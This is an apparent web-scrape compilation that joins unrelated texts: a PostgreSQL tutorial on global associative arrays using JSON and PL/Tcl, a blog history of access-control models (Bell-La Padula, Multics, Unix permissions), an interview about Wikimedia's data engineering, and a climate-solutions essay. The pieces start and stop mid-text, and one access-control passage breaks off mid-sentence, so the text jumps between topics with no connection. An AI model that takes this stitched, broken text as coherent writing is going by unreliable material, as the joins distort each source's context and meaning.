<pre>postgres=&gt; CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode INT[]=ARRAY[123456, 123457, 123458, 123459];<br>BEGIN<br>RAISE NOTICE '1st state pincode %', v_pincode[1];<br>RAISE NOTICE '3rd state pincode %', v_pincode[3];<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;<br>CREATE FUNCTION</pre>
<p>Let us execute the function created above and see the results.</p>
<pre>postgres=&gt; SELECT process_orders();<br>NOTICE: 1st state pincode 123456<br>NOTICE: 3rd state pincode 123458<br>process_orders<br>----------------<br>t<br>(1 row)</pre>
<p>We got the results as expected. However, this code has some limitations because we are unable to fetch the values based on their keys. For example, the pincodes (1st and the 3rd elements) are fetched using their Indexes. If we are able to access the same pincodes based on their keys, then, the lookup will be more powerful. So, how to approach this requirement ? Let us discuss the approach further.&nbsp;</p>
<p><b>Associating or mapping a name or a key to a value</b></p>
<p>Thanks to PostgreSQL’s rich data types such as <strong>hstore</strong> or <strong>json</strong> which can be leveraged to perform such mapping.</p>
<p>Following is a sample code using a <strong>json</strong> static object.</p>
<pre>CREATE OR REPLACE FUNCTION process_orders() RETURNS BOOL<br>AS<br>$$<br>DECLARE<br>--initializing static pincodes<br>v_pincode JSON= '{"CA": 123456, "AZ": 123457, "OH": "123458", "CO": 123459}';<br>BEGIN<br>RAISE NOTICE 'CA state pincode %', v_pincode-&gt;&gt;'CA';<br>RAISE NOTICE 'OH state pincode %', v_pincode-&gt;&gt;'OH';<br>RETURN true;<br>END;<br>$$ LANGUAGE PLPGSQL;</pre>


<p>Let us execute the above created function and see the results.</p>

<pre><code>postgres=&gt; SELECT process_orders();
NOTICE:  CA state pincode 123456
NOTICE:  OH state pincode 123458
process_orders
----------------
t
(1 row)</code></pre>

<p>Now, we are able to make the lookup using a key possible with our PL/pgSQL code. Thus, by using a json type instead of an ARRAY we can implement the concept of associative arrays.&nbsp;</p>

<p><strong>Global Associative Arrays</strong></p>

<p>The json approach demonstrated above seems to be perfect, but it does not solve the problem of global or session level associative arrays. What this means is that the same associative array cannot be accessed using another function running in the same session. This is because of the lack of global variables or global arrays.&nbsp;</p>

<p><strong>How to make Global Associate Arrays possible with PostgreSQL ?</strong></p>

<p>Following are the 5 possible solutions with some or no limitations to each approach.&nbsp;</p>

<ol>
<li><strong>Declare the same json object in the other function.</strong></li>
</ol>

<ul>
<li>Requires duplicating the same variable and the same context.&nbsp;</li>
</ul>

<ol start="2">
<li><strong>Pass the json argument as a parameter to the other function.</strong></li>
</ol>

<ul>
<li>Pass the same value across functions. However, the argument lists may become huge to manage or debug.</li>
</ul>

<ol start="3">
<li><strong>Store this object in a table and load it in the function.</strong></li>
</ol>

<ul>
<li>Storing it in a Table and accessing the elements by selecting from the Table. This can be a heavy overhead.&nbsp;</li>
</ul>

<ol start="4">
<li><strong>Use set_config() approach, which set the object at a session level, and read it from the current_setting().&nbsp;</strong></li>
</ol>

<ul>
<li>If any value is set, an Exception block cannot view the configured settings. May become challenging while performing conversions from Oracle to PostgreSQL where a good amount of logic is written in the Exception block. May be great when we are not accessing any global variables in the exception block. We will be discussing this in detail in our future blog post.&nbsp;</li>
</ul>

<ol start="5">
<li><strong>Using a supported PostgreSQL language context.&nbsp;</strong></li>
</ol>

<ul>
<li>With this approach, we should be able to access the global variables across the exception blocks and also the non exception blocks.</li>
</ul>

<p>The first 4 approaches seem to be pretty straight forward and simple with their own limitations. But the last approach about using another language’s session context is something interesting and we are discussing that further.</p>

<p><strong>Using TCL to support Global Associative Arrays</strong></p>

<p>As we all know, PostgreSQL supports many trusted procedural languages such as PLPerl, PLPython, PLTCL, PLv8 etc. All these trusted languages guarantee that the program code written in that language will not be accessing the underlying physical files. Out of all these programming languages, we will be choosing a simple, safe and a powerful language called <span><a href="https://wiki.tcl-lang.org/page/pltcl">tickle (PLTCL)</a>.</span>&nbsp;</p>

<p>TCL language does support the associative array concepts and we will be leveraging this feature in a global way. This will give more flexibility of lookup of values using keys. Let us see the following example code to see how we can make the declaration of a global variable with tickle (TCL).</p>

<p><strong>TCL instructions<br></strong>As the first step, let’s declare a global variable (namespace) using the following TCL code.</p>

<pre><code>$ tclsh
% # Here, arr_ptr is a pointer to the namespace/global variable "pincodes"
% upvar 0 ::"pincodes" arr_ptr</code></pre>

<p>Now, let’s add a pincode value to this namespace (or the global variable).</p>

<pre><code>% set arr_ptr('CA') 123456
123456</code></pre>

<p>Let us now get the value which we set in the associative array.</p>

<pre><code>% set arr_ptr('CA')
123456</code></pre>

<p>Using the simple example created above, we have seen how we can declare a global variable and store the values using TCL.</p>

<p><strong>Using PLTCL to support Global Associative Arrays in PostgreSQL.</strong></p>

<p>To achieve the functionality of global associative arrays, let us embed the same code in PLTCL as seen in the following steps.</p>
<p><strong>Step 1 :</strong> Create the PLTCL Extension</p>

<pre><code>postgres=&gt; CREATE EXTENSION pltcl;
CREATE EXTENSION</code></pre>

<p><strong>Step 2 : </strong>Create a function using PLTCL to declare the Global Associative Array and set a value.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_set(TEXT, TEXT, TEXT) RETURNS VOID AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2) $3
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Step 3 : </strong>Create a function using PLTCL to get the value mapped to the key.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_get(TEXT, TEXT) RETURNS TEXT AS $$
upvar 0 ::$1 arr_ptr
set arr_ptr($2)
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p><strong>Testing</strong></p>

<p>Let us perform a test using the newly created PLTCL functions.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'CA', '123456');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_get('pincodes', 'CA');
pltcl_get
-----------
123456
(1 row)</code></pre>

<p>As seen in the above example, we are able to get data from the TCL context which is global. Which means, we are able to set the <strong>pincodes</strong> from one statement (using pltctl_set() ), and able to access it’s value from another statement (using pltcl_get()).&nbsp;</p>

<p><strong>Iterating over the Global Associative Arrays</strong></p>

<p>What is an array without an iterator, right? Let us leverage the same TCL code and create another function which iterates over the global array.</p>

<pre><code>postgres=&gt; CREATE OR REPLACE FUNCTION pltcl_itr(TEXT) RETURNS TABLE(key TEXT, value TEXT)
AS
$$
upvar 0 ::$1 arr_ptr
    foreach i  [array names arr_ptr] {
        return_next [list key $i value [set arr_ptr($i)]]
    }
$$ LANGUAGE PLTCL;
CREATE FUNCTION</code></pre>

<p>Now, let’s add a few more entries to `pincodes` global array and do the iteration test.</p>

<pre><code>postgres=&gt; SELECT pltcl_set('pincodes', 'AZ', '123457');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'OH', '123458');
pltcl_set
-----------
(1 row)
postgres=&gt; SELECT pltcl_set('pincodes', 'CO', '123459');
pltcl_set
-----------
(1 row)</code></pre>

<p>Let’s use the iterator function to get all the lists of available <strong>pincodes</strong> from the global array, as seen in the following block.</p>

<pre><code>postgres=&gt; SELECT * FROM pltcl_itr('pincodes');
key | value
-----+--------
CA  | 123456
CO  | 123459
OH  | 123458
AZ  | 123457
(4 rows)</code></pre>

<p>As seen above, this iterator is actually helping to iterate over the global associative array. We can use these values across multiple functions across the same session.&nbsp;</p>

<p><strong>Conclusion</strong></p>

<p>PostgreSQL offers a lot of flexibility in writing the code in multiple languages, which eventually enables us to inherit the power of other programming languages. As you have witnessed in this blog post, we leveraged the TCL’s features and are able to achieve the global associative arrays, which …</p></div></div></div></div></div></div></section></div>

<h2 id="evergreen-challenge">Evergreen Challenge</h2>

<p>Every cloud has its own identity and access management system. AWS and Google use a bunch
of JSON files specifying various rules. Open source projects like Kubernetes support
three concurrent access control models - attribute-based, role-based and
a webhook access control, all expressed using YAML. Some teams are going as far as
inventing their own programming language to solve this evergreen problem.</p>

<p>As many engineers before us, we faced the challenge of choosing the
design and the tooling from the kaleidoscope of JSON, YAML and custom languages
for our own software’s access controls. Which system is the best, and can there be one language to rule them all?
What are the properties of a good access control system, and what mistakes of the past should we avoid?</p>

<h2 id="time-sharing-and-first-pen-testers">Time Sharing and First Pen-testers</h2>

<p>In the early 1960s one computer could be accessed by one person, program and team at a time.
Computers were quite expensive; a PDP-1, for example, would cost you a whopping $120,000.
That’s close to $1M adjusted for inflation in 2021.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/pdp-1.jpg" width="100%" alt="PDP-1 in a computer history museum"></p>

<p><em>DEC PDP-1 in a computer history museum</em></p>

<p>You could securely use the computer for different applications as long as the files and data for
different projects were kept separate. That was a serious bottleneck, and by the mid-sixties manufacturers offered time-sharing systems
that allowed many folks to use computers at the same time.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/time-sharing.jpg" width="100%" alt="Fernando Corbató with MIT's IBM 7090"></p>

<p><em>Fernando Corbató - researcher working on time sharing with MIT’s IBM 7090</em></p>

<p>The arrival of time sharing made folks at the U.S. Air Force worried.
There could be two programs residing in the storage and sharing compute and memory at the same time.
What if a program working on a lower privilege level hacked the system and gained access to sensitive data of another program?</p>

<p>To assess the scope of the problem, USAF formed a special task force to
figure out the impact of such hacks and come up with a solution.
The team came back with some bad news: operating systems at the time were not designed
at all to protect from a malicious program. The executable had almost unrestricted
capability to reference any main and auxiliary memory locations.
The task force concluded that a new approach was needed [1]:</p>

<blockquote>
<p>The operating systems were not designed to be secure, provide a malicious user
with any number of opportunities to subvert the operating system itself.</p>

<p>…</p>

<p>A system designed to be secure, containing;</p>

<p>A) An adequate system access control mechanism</p>

<p>B) An authorization mechanism</p>

<p>…</p>
</blockquote>

<h2 id="bell-la-padula-security-model">Bell-La Padula Security Model</h2>

<p>In 1972, two computer scientists were assigned with the task of designing such a system [2].</p>

<blockquote>
<p>In the summer of 1972, The MITRE Corporation initiated its task to produce a report titled “Secure Computer Systems.”
The modeling task fell to Len La Padula and me. David E Bell.</p>
</blockquote>

<p>In 1972-1974 David E. Bell and Leonard J. La Padula came up with the theoretical foundations of access control systems [3]
and then worked with programmers to implement that in the most promising O.S. at the time — Multics [4].
In the Multics paper, they defined elements of both models still used to this day — subjects,
objects and access control lists.</p>

<ul>
<li><code>subjects</code> are actors, like processes and programs in execution.</li>
<li><code>objects</code> are passive things, like data, files, programs, subjects.</li>
</ul>

<p><img src="https://goteleport.com/blog/images/2021/access/subjects-objects.png" width="100%" alt="Subjects accessing objects"></p>

<p><em>Subjects accessing objects. Here and below are the original figures from the paper.</em></p>

<p>Subjects can access objects. These access modes are governed by access <code>attributes</code>:</p>

<ul>
<li><code>e</code> - no access, <code>r</code> - read-only, <code>a</code> - can write, but not read, <code>w</code> - can read and write.</li>
</ul>

<p>They defined access of subject to object with a triple:</p>
<pre><code>(subject, object, attribute)</code></pre>
<p>Objects are organized in a tree-like structure, forming a hierarchy.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/object-structure.png" width="100%" alt="Object structure"></p>

<p><em>Object structure</em></p>

<p>An access matrix specifies access modes (<code>e</code>, <code>r</code>, <code>a</code>, <code>w</code>) in which subjects can access objects.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/access-matrix.png" width="100%" alt="Access Matrix"></p>

<p>Because MITRE corporation’s research was funded by the military, you would find a couple of parts unfamiliar to
most Unix users — category and classification levels for the U.S. Military — “unclassified”, “confidential”, “secret”, “top secret”.
Categories are general topics such as “Nuclear”, “NATO” or “Crypto”.</p>

<p>Security level assigned to an individual and object is a pair:</p>
<pre><code>(classification, set of categories)</code></pre>
<p>A user can access a document if their security level “dominates” the document level:</p>
<pre><code>(class 1, category-set 1) dominates (class 2, category-set 2) if and only if

class 1&gt;= class 2 and category-set 1 includes category-set 2 as a subset</code></pre>
<p><strong>Simple Security Property</strong></p>

<p>The researchers have defined a first property, as a simple security property:</p>

<p>For a triplet <code>(subject, object, read)</code> the security level of a subject always “dominates” security level of an object.
In other words, subjects can only read objects with the same or lower security level.
This property is also sometimes called “Read down” or “ss-property”.</p>

<p><strong>Star Property</strong></p>

<p>Bell and La Padula noticed that “simple security property” is not enough to protect classified
information. A malicious program could pass classified information along by reading the classified
docs on one level and writing on lower level:</p>

<p><img src="https://goteleport.com/blog/images/2021/access/star-property.png" width="100%" alt="Star property"></p>

<p>They called it “*-property”:</p>

<blockquote>
<p>in any state, if a subject has simultaneous “observe” access to object-1 and “alter”
access to object-2, then level (object-1) is dominated by level (object-2)</p>
</blockquote>

<p>In other words, you cannot read objects at higher security level and write
to objects at lower security level. Some folks call this property “Write Up”.
With this rule in place, any system drifts towards higher and higher clearance level
documents and it creates a practical problem — what if you still need to communicate the
level “down”? They defined “trusted subjects”, exceptions to the “*-property”
rule to communicate some information down and lower clearance of the documents.</p>

<p><strong>Discretionary and Mandatory</strong></p>

<p>To conform to military regulations, the researchers defined a “mandatory” or “non-discretionary” security policy —
an individual may not exercise their judgment to violate access standard, and the enforcement
is mandatory.</p>

<p>Two systems have emerged: Mandatory Access Controls (MAC), in which individuals
have no say in whether to set up their access levels, and Discretionary Access Control (DAC), in which folks
have some say who can access what.</p>

<p>Discretionary security is defined by access matrix above and specified as “ds-property”:</p>

<blockquote>
<p>if (subject-i, object-j, attribute-x) is a current access … then attribute-x is recorded
in the (subject-i, object-j) component of M …</p>
</blockquote>

<p>In other words, subjects can access objects if there is a matching access attribute
in the matrix.</p>

<p><strong>Basic Security Theorem</strong></p>

<p>Bell and La Padula defined “Basic security theorem” as a combination of
“ss-property”, “*-property” and “ds-property’.</p>

<p>In their assessment, the system is secure if:</p>

<ul>
<li>Users can only read resources at lower or equal security levels (Read Down)</li>
<li>Subjects cannot read objects at higher level and write to objects at lower level (Write Up)</li>
<li>System enforces access attributes on any subject-object access.</li>
</ul>

<p>The researchers were excited about “inductive nature” of the Basic Security Theorem — the system
will stay secure through all transitions as long as these three rules are enforced.</p>

<p>In the security world, this is also called security invariant — a property that system
keeps true at all times despite all the changes.</p>

<p><strong>Multics</strong></p>

<p><img src="https://goteleport.com/blog/images/2021/access/multics.jpg" width="100%" alt="Visicalc on Multics"></p>

<p><em>Visicalc running on Multics</em></p>

<p>Based on this paper, Multics engineers introduced access control lists — <code>ACL</code>.
Multics “ACLs” were composed of <code>(process, ring bracket)</code> pairs, where process is analogue of
the paper’s subject and ring bracket is a clearance level.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/acls.png" width="100%" alt="Multics ACLs"></p>

<p><em>Multics ACLs. Multics Paper</em></p>

<p>Objects could be “directory segments”, data segments, certain I/O devices, certain
address spaces and sockets.</p>

<p>Multics stored ACLs in the parent directory of an object and manipulated them
by altering the directory properties. Control over an object was represented
by write permission on an object’s directory.</p>

<p><img src="https://goteleport.com/blog/images/2021/access/segment.png" width="100%" alt="Adding Segment to DIR"></p>

<p><em>Adding Segment to DIR. Multics Paper</em></p>

<p>A request to give access to an object is allowed only if the requesting subject
has current <code>w</code> access to the parent of the object.</p>

<p>Imagine a situation when a user created unclassified folder <code>Or</code>, then in it,

<p>An unclassified user can’t access the file <code>O2</code> because they can’t access the secret folder <code>O1</code>.
This would have violated the ss-property — because unclassified users can’t read the
secret data and *-property, where users can’t read secret data and write to non-secret files
at the same time. They called it “The need for compatibility” — a child’s object
security levels should be higher than the parent’s object security levels.</p>

<p>Chances are, you are using discretionary access control implementation of the Bell-La-Padula
model every time you access a file on your system.</p>

<p><strong>Discretionary Access Controls</strong></p>

<p>Unix devs were frustrated with Multics’ complexity. Even Unix itself is a pun on Multics —
“Uniplex information and computing service”,  compared to Multics’  “Multiplex information and computer services”.
They dropped most of the complex stuff and kept only the discretionary part securing access to files with permissions.</p>

<p><em>Ken Thompson and Dennis Ritchie hacking on PDP-11 and probably ranting about Multics complexity</em></p>

<p>DAC defines an owner of a resource, for example a file. A file owner specifies what others
can do to this file. Linux access control list system defines a set of permissions - read <code>(r)</code>, write <code>(w)</code> and execute <code>(x)</code>.
Users are divided into three classes: owners, groups and other. Every Linux file has a list of
access controls defined for every user class. Here is, for example an ACL for a file “animals.pl” on my computer:</p>
<div><pre><code data-lang="bash">$ ls -l animals.pl
-rw-r--r-- <span>1</span> sasha admins <span>187</span> Nov <span>28</span> 15:14 animals.pl</code></pre></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h6>What is the company about? What are you building?</h6><p>The data engineering team at Wikimedia maintains what would be a traditional data pipeline for product teams to gather data to aid in product execution. What is different in the open knowledge ecosystem is that much of the metadata about Wikipedia is also public. This means that you can get a <a href="https://dumps.wikimedia.org/">myriad of datasets</a> with <a href="http://stats.wikimedia.org/">pageviews for every article</a>, unique devices, editors per country, etc.<br></p><p>All this data is delivered every hour and has been so for more than 15 years. It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP. Maintaining all the pipelines for data delivery for a system that <a href="https://grafana.wikimedia.org/d/000000500/varnish-caching?viewPanel=5&amp;orgId=1&amp;refresh=15m">at peak gets 200,000 requests </a>per second is needless to say, quite a task.&nbsp;&nbsp;</p><p>‍</p><blockquote>It is not an overstatement to say that Wikipedia's open datasets have played a <a href="https://commons.m.wikimedia.org/wiki/File:The_role_of_Wikipedia_on_AI_(Wikimania,_2019).pdf">key role in the development of many technologie</a>s we take for granted, like NLP<br></blockquote><h6>Can you describe the high level data architecture? Wikipedia is pretty open and I know you use Cassandra, Druid, Kafka, how those work together. In other words, what’s the data path from a GET request to a wikipedia page to something you can render on a graph.</h6><p>Something that is not well-known is that the whole puppet repo that describes Wikipedia's is public and you can take a look at it on<a href="https://github.com/wikimedia/puppet"> github</a>. To this day I find this impressive, that every single piece of infra of all Wikipedia's systems is described there. We also provide <a href="https://meta.wikimedia.org/wiki/Wikimedia_servers#/media/File:Wikipedia_webrequest_flow_2020.png">pretty pictures of the stack.</a><br></p><p>The data stack is very standard. As you mentioned we have Kafka for data intake, Hadoop as a persistent storage and from those two data gets ingested into Cassandra or Druid. There are different pipelines with different bells and whistles, some of them have a JSON <a href="https://schema.wikimedia.org/#!/">schema registry</a> and some others parse data out of the HTTP requests directly.&nbsp; In Wikipedia, 97% of requests at all times are cached and thus served from the CDN via Varnish. So, in order to gather all this data, we need Varnish to be able to talk to Kafka, we have a custom piece called varnishkafka that is a source of joy (#not) for our SRE team. The migration to Apache Traffic Service will eventually render this piece of infra obsolete.&nbsp;<br></p><p>There are two distinct sources of data: data from <strong>readers </strong>and <strong>editors</strong>. While data for readers is very high volume is quite "simple". It can be thought as simple pageviews. Edit data is however a lot more complicated and in order to harvest it properly we developed a <a href="https://en.wikipedia.org/wiki/Lambda_architecture">Lambda-ish architecture</a>. We source this data two ways, once a month from the MediaWiki database directly and via Spark, after 2 days of processing in a ~60 nodes hadoop cluster we create large <a href="https://wikitech.wikimedia.org/wiki/Analytics/Data_Lake/Edits">denormalized tables</a>.&nbsp; And at the same time we have event streams of data that publish every edit event to wikipedia as a json blob real time and those also get persisted on hadoop. We made a very conscious decision to use <a href="https://techblog.wikimedia.org/2020/09/10/wikimedias-event-data-platform-or-json-is-ok-too/">JSON versus AVRO</a> in most of our data pipelines and, since then, the Kafka ecosystem has moved more towards being a lot more friendly towards JSON. Makes sense, because JSON is a lot easier to debug.&nbsp;<br></p><p>The visualization layer is Superset, a nifty UI tool that can be used against druid but also <a href="https://prestodb.io/">Presto</a>, a very fast data query engine developed by Facebook that can be deployed on top of hadoop and it is fully ANSI SQL compliant.</p><h6>Wikipedia does not use any cloud provider, how does that change the way architecture is designed?</h6><p>Everything is developed from the ground up so we favor open source solutions tried and tested at scale. Much of the data pipeline of Wikipedia exists thanks to Facebook and LinkedIn open source efforts.</p><p>‍<br></p><h6>Also, you only use open source software, how do you pick the right tool for the job? Are software licenses a limitation? Could you use Mongo or Elastic for example?</h6><p>If we need a piece of software that, for example, pulls data from Kafka we survey the ecosystem and look at what exists that is tried and tested and fully open source. We do couple small prototypes and evaluate results. See for example our recent spike on <a href="https://wikitech.wikimedia.org/wiki/Analytics/Systems/Cluster/Workflow_management_tools_study">Airflow and others</a>.&nbsp; Licenses that do not provide the same level of freedom as <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0</a> are a problem. We cannot, for example,&nbsp; use the licenses for Kafka Connect which are too restrictive. We <a href="https://diff.wikimedia.org/2014/01/06/wikimedia-moving-to-elasticsearch/">have been using Elastic since 2014</a> but that, with their new license, might need to change.&nbsp;</p><p>‍<br></p><h6>What are some of the hardest data problems you’ve had to solve so far?</h6><p>Something that I have learned in these 20 years of work is that most of the real hard problems have to do with people, rather than technology.</p><p>Now, I would say the hardest problems in the data realm on 2021 have to do with Privacy. At Wikipedia Privacy is paramount (there cannot be truly free access to knowledge without a guarantee of privacy) and we had to "invent" methods to calculate in privacy-conscious ways metrics that are the norm for web properties, like Monthly Active Users. You can see <a href="https://diff.wikimedia.org/2016/03/30/unique-devices-dataset/">how we did it.</a> Still, the hardest problem was probably communicating effectively how much we care about Privacy.</p><p>‍</p><h6>What are the hard ones still unsolved?</h6><p>Data quality issues are kind of a "<a href="https://en.wikipedia.org/wiki/Fractal">fractal</a>" problem, you are never done eliminating those completely. <a href="https://phabricator.wikimedia.org/T211833">Here</a> is an example of a problem with data quality that was invisible to data throughput alarms and here is the first idea we had on how to partially solve issues like these (spoiler: entropy counts). Now, these examples make apparent how other quality issues of more complex nature would slip by.&nbsp;</p><h6>How did the architecture change during your 6 years at wikipedia?</h6><p>I would say it is recently that streaming or event-based architectures&nbsp; have become an achievable reality, little by little we are moving towards a world with more <a href="https://diff.wikimedia.org/2017/03/20/eventstreams/">streaming services.</a>&nbsp;</p><h6>Tell us some interesting numbers (traffic, rows, gigabytes you store, process, infra costs and so on)</h6><p>Wikipedia's <a href="https://wikimediafoundation.org/about/financial-reports/">budget is public</a>, the site and the 400 people on staff plus a number of projects and chapters are run with a budget of about $100 million dollars per year. The whole data stack hardware costs are minimal, less than a million dollars per year for about 3PB of data. We process and aggregate a lot of data but also, according to our privacy policy, a lot of it is discarded.</p><h6>What’s the most interesting use case solved with data. I know you have <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">pretty interesting blog posts</a> about it.</h6><p>My two favorite projects are more data scienc-y than data engineer-y and in both I collaborated with our team of Researchers which are the ones that really came into gauge whether the engineering ideas are mathematically sound.<br></p><p><strong>Bot detection</strong>: It took us a bit but we finally were able to flag a lot of the automated traffic that Wikipedia gets and tag it as such on our data releases and internal reports. Some of this traffic is benign (in the sense of it only using resources). An <a href="https://phabricator.wikimedia.org/T273741">example</a>.&nbsp; Other traffic, however, is not so innocuous. There are many attempts to manipulate Wikipedia's top pageview lists, for example. Most recently someone was trying to add a bunch of obscene terms to the top pageview list of Hungarian Wikipedia.</p><p>While on first instance, this seems like a simple classification problem, getting a labeled dataset to do prediction is actually not that simple. It&nbsp; requires building pseudo-sessions on top of data that has no common identifiers to know that two requests came from the same entity. We ended up using heuristics rather than ML and things worked out pretty well. You can read about the details of it <a href="https://techblog.wikimedia.org/2020/10/05/bot-or-not-identifying-fake-traffic-on-wikipedia/">here</a>.<br></p><p><strong>Censorship Alarms: </strong>We wanted to identify events in which active censorship of Wikipedia sites is ongoing. Wikipedia was blocked in Turkey for years and it is today blocked in Mainland China. Besides these countries like Iran block Wikipedia on and off. Looking at that problem in detail we realized that it had a lot in common with problems with data quality so we used some of the same techniques to alarm when "it seemed" a country had an anomalous traffic pattern. Again, this is less easy than it seems at first sight because you do not want to alarm unnecessarily and uniform traffic drops do not constitute an event. Anomalous traffic drops do. See how we did it <a href="https://techblog.wikimedia.org/2021/01/15/censorship-outages-and-internet-shutdowns-monitoring-wikipedias-accessibility-around-the-world/">here</a>.&nbsp;&nbsp;</p><p>‍<br></p><h6>What are the most interesting, unexpected, or challenging lessons that you have learned? I guess there are plenty of them related to user privacy. How that changes in comparison to a “regular company”, what things you need to be careful when dealing with data.</h6><p>Lessons learned are many: in environments where the work is principle-based rather than profit based defining metrics is not easy.&nbsp; When everyone cares a lot about the larger mission of their work there is going to be a lot of strong discussions, once consensus is reached execution is fast with zero management oversight. Also, principles are very useful when choices are needed so in a way, working on a strong principle based organization makes some choices easy (ex: only use open source, preserve the right to fork) even if those choices imply a lot of work.</p><h6>How was your team organized: people, roles. What was your objective as a team? I guess one of them would be to create internal tools but I know you have some external tools and data.</h6><p>The larger Technology team reports to the CTO, there are several parallel teams: Security, SRE, Data Engineering, Performance... Those teams work independently but coordinate among themselves.&nbsp;The mission of the Data Engineering team is to serve internal customers but also the large external community. I think for a team in an organization as large in impact as Wikimedia is crucial to have a mission statement, otherwise it is easy to get lost in the many (infinite, really) requests for work. Our mission was to "empower and support data informed decision making across the Foundation <strong>and</strong> the Community". We make Wikimedia related data available for querying and <strong>analysis</strong> to both Wikimedia employees and the different Wiki communities and stakeholders."<br>This mission, notice, involves serving a large group of stakeholders, the community of editors that do not …</p></div></div></div>

Graphic by Jonathan Foley © 2021.</figcaption></figure></div></div></div><div><p id="8ef1">As we look to halving emissions by ~2030 and reaching net-zero by ~2050, I like to think of <strong>climate solutions moving in “waves” along several parallel fronts</strong>. Each one of these “waves” needs to <em>begin</em> <em>today</em> — but they unfold differently and yield results over time.</p></div></section><section><div><div><p id="2105"><span>To</span> understand this, it is important to see that <strong>each family of climate solutions has a <em>characteristic timescale</em></strong><em> </em>associated with it. That is, climate solutions tend to cluster into different categories, each with its own sequencing and pace.</p><p id="f27b">For example, some actions can return <em>rapid</em> results, like radically improving energy efficiency, stopping deforestation, or capping methane leaks and black carbon emissions. Others make steady progress as we upgrade the world’s infrastructure — electrifying millions of buildings and vehicles and changing practices on millions of farms and ranches across the globe. Some others are naturally slower, like sequestering carbon by planting trees or regenerating soils, which build up over decades. And some solutions could be game-changers in the future but still require decades of research and development to come to fruition.</p></div></div></section><section><div><div><p id="04a3"><span>I</span> think <strong>we need <em>all</em> these solutions — pursued in parallel</strong>. The challenge is to <em>weave them together over time</em>, to make the most progress possible, decade by decade.</p><p id="5423">Below, I have organized climate solutions into <strong><em>four major waves of action</em></strong>, which I think can play out in different ways.</p></div></div></section><section><div><div><p id="4fc7">To dramatically cut emissions in the 2020s, we need aggressive and immediate action. Fortunately, there are solutions that can help with this.</p><p id="e636">Some “Quick Win” solutions focus on <strong>halting highly destructive practices, </strong>such as widespread deforestation, flaring and fugitive emissions of methane, and “black carbon” emissions from dirty cookstoves, biomass burning, and other sources. The moment we stop these practices, their emissions cease too. And reducing methane and “black carbon” emissions helps a great deal in the short term, as they pack a huge warming punch up front, while carbon dioxide warms more gradually. In other words, cutting methane and black carbon emissions now buys us time while we tackle other emissions.</p><p id="ce81">Other “Quick Win” solutions <strong>focus on efficiency and waste,</strong> which can also achieve rapid emissions reductions. There are <em>enormous</em> opportunities to be more efficient in electricity use (especially in buildings and industrial processes), industry (through better management of waste and materials, especially refrigerants), transportation (increased fuel efficiency and alternative transportation), and buildings (with weatherization, insulation, building automation, and preventing refrigerant leaks). And in the food sector, we should dramatically cut food waste (~30–40% of the world’s food is <em>never</em> eaten), which can also greatly lower emissions.</p><p id="6379">There are obstacles to implementing all of these solutions, of course, but they offer large and immediate emissions reductions, plus strong economic returns. They are among the lowest hanging fruits, and that’s what we need for immediate results.</p></div></div></section><section><div><div><p id="70e3">In addition to “Quick Wins”, we simultaneously need to start replacing old infrastructure with new, low-emitting systems.</p><p id="3278">To begin, we have to <strong>shut down fossil fuel energy sources</strong> and <strong>deploy renewable energy</strong> across the planet as quickly as possible. But given the enormous physical infrastructure and capital involved, this will inevitably take time. Even the most aggressive scenarios of this energy transition require the 2020s and 2030s to complete.</p><p id="51cb">Beyond phasing out fossil fuels and replacing them with renewables, we will simultaneously have to <strong>electrify everything</strong>. That means updating nearly every building on Earth so that heating and cooling systems are using renewable electricity. We will also have to retire nearly every vehicle on Earth, replacing them with electric bikes, cars, trucks, and trains.</p><p id="a686">And we will have to change <strong>almost every farm and ranch</strong> on Earth, transitioning them from highly-emitting farming techniques to low-emissions methods, including so-called regenerative practices.</p><p id="c5d6">We need to get started on all of these big transitions <em>today</em>, but given the massive infrastructure (and capital) turnover involved, this is going to take a concerted effort over two or three decades to accomplish. It reminds me of the old joke: <em>Question: What’s the best time to get started? Answer: 30 years ago. Question: What’s the second-best time to get started? Answer: Today.</em></p></div></div></section><section><div><div><p id="eadb">The only viable paths to address climate change require we eventually bring emissions to zero. But <strong>we can also create carbon sinks </strong>— especially <a rel="noopener" href="https://globalecoguy.org/carbon-offsets-should-make-you-nervous-9995a00db0d6">using nature-based carbon removal</a> approaches — that <em>absorb</em> some of our emissions, or even begin to remove some of our past pollution.</p><p id="721d">To do this, we must start by<strong> protecting Earth’s <em>existing</em> carbon sinks</strong>, found in forests and the ocean. While we want to build <em>additional</em> carbon sinks, we first need to ensure that existing sinks — which remove ~55% of our carbon dioxide emissions and ~40% of our total greenhouse gas emissions — are maintained. If these start to decline, we will be under even more pressure to cut emissions and create other carbon sinks.</p><p id="6c5c">Beyond protecting nature’s <em>existing</em> carbon sinks, we can start to <strong>add new ones by restoring ecosystems</strong>, especially by planting trees. There are discussions about planting billions and billions of trees to absorb some of our remaining emissions. However, the merits and practicality of these schemes are still hotly debated. In addition to tree planting, <strong>we could use regenerative farming practices </strong>on croplands, pastures, and degraded lands — building back carbon in the soils and vegetation, creating new carbon sinks. There are debates about the effectiveness of these solutions, but there is enormous potential for carbon uptake on our working lands.</p><p id="2f8b">This wave of climate solutions is, by its very nature, steady and gradual, playing out 